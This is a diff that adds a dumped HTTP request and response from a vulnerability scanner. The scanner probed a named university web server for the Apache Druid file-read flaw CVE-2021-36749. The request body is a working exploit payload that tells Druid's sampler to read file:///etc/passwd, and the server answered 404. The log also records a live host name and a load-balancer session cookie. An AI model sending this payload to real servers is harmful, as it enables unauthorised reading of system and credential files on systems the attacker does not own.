@@ -1,0 +1,32 @@
+[CVE-2021-36749] Dumped HTTP request for https://lms.vet.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+
+POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+Host: lms.vet.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 410
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
+[CVE-2021-36749] Dumped HTTP response https://lms.vet.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 285
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:18:03 GMT
+Server: Apache/2.4.62 (Debian)
+Set-Cookie: BIGipServer~app_vetlive_prod~pool_vetlive_prod_live=2035554220.47873.0000; path=/; Httponly; Secure
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at lms.vet.unimelb.edu.au Port 443</address>
+</body></html>
+
